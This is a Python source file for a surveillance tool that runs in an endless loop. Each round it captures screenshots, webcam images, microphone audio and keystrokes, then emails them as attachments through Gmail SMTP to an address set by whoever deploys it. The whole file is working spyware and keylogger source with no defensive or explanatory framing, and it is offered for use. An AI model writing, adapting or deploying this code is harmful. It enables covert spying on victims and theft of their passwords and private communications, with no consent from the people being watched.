import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from PIL import ImageGrab
from pynput import keyboard
import time
import cv2
import sounddevice as sd
import soundfile as sf
import os

# Set up email parameters
sender_email = "Email_Address"                 # Write Your Email Address on which you want to send the details.
sender_password = "Password"
recipient_email = "Email_Address"

# Set up email message
msg = MIMEMultipart()
msg['From'] = sender_email
msg['To'] = recipient_email
msg['Subject'] = "Keylogger, Screenshot, Webcam, and Audio Report"

# Set up keylogger
keys = []

def on_press(key):
    global keys
    keys.append(key)

def clear_keys():
    global keys
    keys = []

# Set up screenshot
screenshot_filename = "screenshot.png"

# Set up webcam
webcam = cv2.VideoCapture(0)
webcam_filename = "webcam_capture.jpg"

# Set up audio recording
audio_filename = "audio_recording.wav"
duration = 10  # Recording duration in seconds

# Main loop
while True:
    try:
        # Take screenshot and add as attachment
        im = ImageGrab.grab()
        im.save(screenshot_filename)
        with open(screenshot_filename, "rb") as f:
            part = MIMEApplication(f.read(), _subtype="png")
            part.add_header('Content-Disposition', 'attachment', filename=screenshot_filename)
            msg.attach(part)

        # Capture image from webcam and add as attachment
        ret, frame = webcam.read()
        cv2.imwrite(webcam_filename, frame)
        with open(webcam_filename, "rb") as f:
            part = MIMEApplication(f.read(), _subtype="jpg")
            part.add_header('Content-Disposition', 'attachment', filename=webcam_filename)
            msg.attach(part)

        # Record audio from microphone
        print("Recording audio...")
        audio_data = sd.rec(int(duration * 44100), samplerate=44100, channels=2, dtype='float32')
        sd.wait()
        sf.write(audio_filename, audio_data, 44100, 'PCM_24')

        # Add audio recording as attachment
        with open(audio_filename, "rb") as f:
            part = MIMEApplication(f.read(), _subtype="wav")
            part.add_header('Content-Disposition', 'attachment', filename=audio_filename)
            msg.attach(part)

        # Reset key buffer and start keylogger
        clear_keys()

        with keyboard.Listener(on_press=on_press) as listener:
            time.sleep(60)
            listener.stop()

        # Write keylogs to file
        with open("keylogs.txt", "w") as f:
            for key in keys:
                f.write(str(key))

        # Add keylogs as attachment
        with open("keylogs.txt", "rb") as f:
            part = MIMEApplication(f.read(), _subtype="txt")
            part.add_header('Content-Disposition', 'attachment', filename="keylogs.txt")
            msg.attach(part)

        # Send email
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        text = msg.as_string()
        server.sendmail(sender_email, recipient_email, text)
        server.quit()

        # Wait before repeating
        time.sleep(60)

    except Exception as e:
        print("An error occurred:", e)
        #Release webcam
        webcam.release()
